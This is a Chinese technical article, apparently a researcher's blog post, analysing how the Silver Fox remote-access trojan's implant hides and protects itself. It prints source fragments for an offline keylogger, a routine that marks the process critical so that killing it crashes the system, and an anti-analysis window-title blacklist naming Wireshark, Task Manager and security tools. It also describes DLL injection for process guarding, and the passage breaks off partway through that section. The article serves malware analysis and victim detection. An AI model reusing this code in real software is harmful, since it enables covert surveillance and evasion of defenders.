---
title: 银狐远控软件的被控端是如何隐藏和保护自己的
url: https://mp.weixin.qq.com/s/QjFLGYIzL1UUr-0EsvZJOw
source: Doonsec's feed
date: 2026-01-09
fetch_date: 2026-01-10T03:22:59.356362
---

# 银狐远控软件的被控端是如何隐藏和保护自己的

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GSweNIrkicYsDG1kE1rdIx78LA4zsOHAoIf0VuYWGjWI6qaFNYEzFic4pLMkKDO9FxyYp3CicwZ3LKmzxRDuic05sg/0?wx_fmt=jpeg)

# 银狐远控的被控端是如何隐藏和保护自己的

原创

安全研究员

CppGuide

![]()

在小说阅读器中沉浸阅读

最近由于工作需要，在研究银狐这套经典远控源码。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GSweNIrkicYuO7qxZCEZEPIa3STMW4wa20ylAJb7YVeqK8MAV71BZaDEV1eIvcZ4r2N5mr9pMJwnuiav2c0dTTEg/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0)

特别申明：

**1. 本文介绍的内容仅做技术上的交流，请勿使用本文介绍的技术做其他用途，违者与本号无关。**

**2. 作者不提供任何支持免杀版本的银狐源码，不做任何黑产，有此需求的读者请勿联系作者。**

在银狐生成被控端的界面，有5个可选项，分别是：

* 键盘记录
* 结束蓝屏
* 反查流量
* 进程守护
* 傀儡进程

如下图所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GSweNIrkicYsDG1kE1rdIx78LA4zsOHAoopDc5ULv75iaELBssYtrN6wAluxRaXIZZVEuBhxgDW7hHqhFqrCDgHA/640?wx_fmt=png&from=appmsg)

看这些名称都是感觉是一些“高大上”的功能，那么到底是否高大上呢，我们本次就从纯技术的角度来分析一下这几个选项到底实现了哪些功能。

首先，勾选这些功能项之后，会在生成的被控端中设置相应的选项值，然后被控启动时，会检查这些值的设置，以确定是否启动这些功能，选项怎么设置的，本文就不展开了，逻辑比较简单，下面重点来说一下这几个选项背后对应的功能，咱们既然是学习技术，不会泛泛而谈，会逐一详解每个选项的技术实现细节，挨个来。

### 键盘记录

键盘记录起作用的位置位于`登录模块`中，如下图所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GSweNIrkicYsDG1kE1rdIx78LA4zsOHAoWnuv2E8TCJhbbo7I957SVyJJkQvYeCqdk16jqHJvDqw3Eu99zCW4yw/640?wx_fmt=png&from=appmsg)

登录模块启动后会开启一个键盘监控线程，线程代码如下：

```
unsigned int __stdcall KeyLoggerThreadProc(LPVOID lparam)
{
    HANDLE hObject;
    do
    {
        hObject = CreateMutex(NULL, FALSE, MyInfo.Remark); //互斥下
        if (GetLastError() != ERROR_ALREADY_EXISTS)
        {
            do
            {
                if (MyInfo.otherset.IsKeyboard || GetOpenKeyLoggerReg())  //等待授权
                {
                    if (!Input::initialize(GetConsoleWindow(), GetModuleHandle(NULL)))
                        return 0;
                    Input::savekerboard();
                }
                Sleep(1000);
            } while (TRUE);
        }
        Sleep(1000);
    } while (TRUE);

    return 0;
}
```

其中这一行`if (MyInfo.otherset.IsKeyboard || GetOpenKeyLoggerReg())` 第一个判断条件`MyInfo.otherset.IsKeyboard`就对应生成被控时是否勾选了`键盘记录`选项。

第二个条件`GetOpenKeyLoggerReg()`会检测下图注册表位置是否设置了值为1，如果为1，则表示开启，不存在该选项或值，或者为0，则关闭。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GSweNIrkicYsDG1kE1rdIx78LA4zsOHAofdyPfLMsOLOEvFeE7ibDYUbia4bta3oJzvCRPSCAiaG0Dzkfrcj4Nic1jA/640?wx_fmt=png&from=appmsg)

这两个位置参数综合决定了被控上线时是否自动开启离线键盘记录功能，所谓离线键盘记录是指即使没有加载键盘记录插件，也会自动将用户的键盘输入记录到指定文件，一般位于程序数据目录下，例如`C:\ProgramData\DisplaySessionContainers.log`。这是一个未加密的二进制文件，看名字具有迷惑性，被普通用户发现了，也可能只是当做某些程序的日志文件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GSweNIrkicYsDG1kE1rdIx78LA4zsOHAoDep77FZnfa3dyhEa3VjFB2hX21kt7XDiaxDX7CyO64exchrn1NftknQ/640?wx_fmt=png&from=appmsg)

DisplaySessionContainers.log被银狐解析出来显示和注册表位置的开关在离线键盘插件位置如下图所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GSweNIrkicYsDG1kE1rdIx78LA4zsOHAoLpjmrDiarLfmDKXNndBJdXQpicxTWia3L8G9rwO1NNe1cdAaKyVkG2WVg/640?wx_fmt=png&from=appmsg)

银狐被控写入注册表位置和选项名也具有迷惑性，大多数人包括开发人员都不敢轻易删除这个位置的注册表项。我们可以使用Sysinternals工具ProcessMonitor可以发现这是一个非系统进程的行为。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GSweNIrkicYsDG1kE1rdIx78LA4zsOHAoLicTRv82iaulI3XLyRCwU0HUAa6muZp6Ky8FncSZMuEGg1AmlEUXc1mw/640?wx_fmt=png&from=appmsg)

我之所以详细介绍这些非技术的内容是希望帮助那些被类似木马窃取信息的同学，让大家有个基础的判断、排查和防御能力。

上述离线键盘记录线程函数`KeyLoggerThreadProc`使用了一个无限循环去不断检测注册表的开关项以决定是否开启离线键盘记录。笔者认为有点滥用被控电脑资源，更好的实现方式是利用是Windows提供了一个监测注册表指定项是否有变化的API——**RegNotifyChangeKeyValue**，可以利用这个API挂起和按需唤醒这个线程来优化资源利用率，开源VNC远控中就是这么做的。

```
LONG RegNotifyChangeKeyValue(
  HKEY   hKey,
  BOOL   bWatchSubtree,
  DWORD  dwNotifyFilter,
  HANDLE hEvent,
  BOOL   fAsynchronous
);
```

小方老师在他的《[C/C++工程实践实战训练营](https://mp.weixin.qq.com/s?__biz=Mzk0MjUwNDE2OA==&mid=2247499820&idx=1&sn=333870bab211b85e5d41f89e2df0f0e8&scene=21#wechat_redirect)》中详细地详细拆解过VNC远控的源码。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/GSweNIrkicYuyTeAUQeiacbicOuhv6ClAiaCgdQ9vkQgbDNt51yn99YDGO0SL7fCFKQ99tw7AGaBWNCR0Q2D1rib29g/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=4)

当然，离线键盘记录功能原版本也存在一些崩溃问题，我在前面一篇文章《[详解银狐远控源码中那些C++编码问题](https://mp.weixin.qq.com/s?__biz=Mzk0MjUwNDE2OA==&mid=2247500571&idx=1&sn=9e57cfeb1c51e063f5954fa7caf41676&scene=21#wechat_redirect)》问题三中已经介绍过，这里不再赘述。

### 结束蓝屏

这个选项名起的有点让人费解，其本意是说如果被控被手动结束了，例如在任务管理中结束，会让被控所在的机器出现蓝屏。这是被控自我保护的措施。好在，这个功能在现在大多数电脑上已经失效。其实现逻辑在被控上线模块中，实现位置如下图，也是位于`登录模块`中。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GSweNIrkicYsDG1kE1rdIx78LA4zsOHAoqiaqKJhpsRfsEuobXc1XkicSw75q2xkJ9mcDQLmU8ODKyxnGdJU93utQ/640?wx_fmt=png&from=appmsg)

如果生成被控时勾选`结束蓝屏`选项，`MyInfo.otherset.ProtectedProcess`的值为true，会执行`CallNtSetinformationProcess`函数：

```
typedef NTSTATUS(NTAPI* _NtSetInformationProcess)(
    HANDLE ProcessHandle,
    PROCESS_INFORMATION_CLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength);

BOOL CallNtSetinformationProcess()
{
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        CloseHandle(hToken);
    }
    _NtSetInformationProcess NtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtSetInformationProcess");
    if (!NtSetInformationProcess)
    {
        return 0;
    }
    HANDLE hProcess;
    ULONG Flag = 1;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, _getpid());
    //29代表系统会触发 bugcheck（蓝屏）
    NtSetInformationProcess(hProcess, (PROCESS_INFORMATION_CLASS)29, &Flag, sizeof(ULONG));
    return 1;
}
```

这里有两个技术细节：一个是从`NtDll.dll`中获取Native API `NtSetInformationProcess`，然后调用之使系统蓝屏。Windows Native API 跳过kernel32.dll等dll直接调用系统服务，Windows Native API微软没有什么文档说明，大家使用的时候都来自各类安全逆向和社区分享，微软自己也大量使用这类API，例如任务管理器的实现。我近期计划出一个介绍Windows Native API的专栏，有兴趣的小伙伴可以关注一下。

第二个细节是，调用`OpenProcess(PROCESS_ALL_ACCESS, FALSE, _getpid())`申请的权限是`PROCESS_ALL_ACCESS`，这个非管理员权限运行的被控一般因为权限不够不会调用成功，所以又进一步降低了蓝屏功能的危害。

但是这类功能还是很恐怖的，严禁滥用。

### 反查流量

这个功能是银狐被控对自己进行保护的另外一个策略，开启后，当银狐检测到，你尝试在电脑上运行一个系统监控和分析类的软件时，就会自动断开与主控的网络链接。

对应的配置项名叫`antinet`，反流量侦查有多处，这里以`登录模块`建立网络连接之后立马检测为例，如下图所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/GSweNIrkicYsDG1kE1rdIx78LA4zsOHAo0WCRoXcnDKcfRqWjTZjQPcIOEDHGCd3hzEosia3cgvuRPwiasfVe7D8A/640?wx_fmt=png&from=appmsg)

实现逻辑在`AntiCheck`函数中：

```
BOOL AntiCheck()
{
    BOOL ret = FALSE;
    EnumWindows((WNDENUMPROC)EnumWindowsProc, LPARAM(&ret));
    return ret;
}
```

逻辑很简单，就遍历被控机器上当前打开的窗口，然后如果这些窗口标题带如下字样就把与主控的连接断开：

```
bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
    if (NULL == hwnd)
    {
        return FALSE;
    }
    if (!IsWindowVisible(hwnd))
        returntrue;

    BOOL* ret = (BOOL*)lParam;
    TCHAR* strTitle = new TCHAR[1024];
    ::memset(strTitle, 0, sizeof(strTitle));
    ::GetWindowText(hwnd, strTitle, 1000);
    if (_tcsstr(strTitle, _T("流量")) ||
        _tcsstr(strTitle, _T("ApateDNS")) ||
        _tcsstr(strTitle, _T("Malwarebytes")) ||
        _tcsstr(strTitle, _T("TCPEye")) ||
        _tcsstr(strTitle, _T("TaskExplorer")) ||
        _tcsstr(strTitle, _T("CurrPorts")) ||
        _tcsstr(strTitle, _T("Port")) ||
        _tcsstr(strTitle, _T("Metascan")) ||
        _tcsstr(strTitle, _T("Wireshark")) ||
        _tcsstr(strTitle, _T("任务管理器")) ||
        _tcsstr(strTitle, _T("资源监视器")) ||
        _tcsstr(strTitle, _T("网络分析")) ||
        _tcsstr(strTitle, _T("Fiddler")) ||
        _tcsstr(strTitle, _T("火绒")) ||
        _tcsstr(strTitle, _T("Capsa")) ||
        _tcsstr(strTitle, _T("Sniff")) ||
        _tcsstr(strTitle, _T("Capsa")) ||
        _tcsstr(strTitle, _T("Process")) ||
        _tcsstr(strTitle, _T("提示符")))

    {
        *ret = TRUE;
        SAFE_DELETE_AR(strTitle);
        return FALSE;
    }
    else
    {
        SAFE_DELETE_AR(strTitle);
        return TRUE;
    }

    return TRUE;
}
```

由于被控有重连机制，所以当连接断开时，当这些软件被关闭，被控继续连上主控然后继续“工作“了。

### 进程守护

勾选了进程守护，被控会执行这样一个功能：

被控启动时会向利用Dll+CreateRemoteThread API远程注入技术，先启动机器上的svchost.exe进程，然后注入一段代码。这段代码不断检测被控进程是否存在，如果不存在就重新拉起被控。

对Dll+CreateRemot...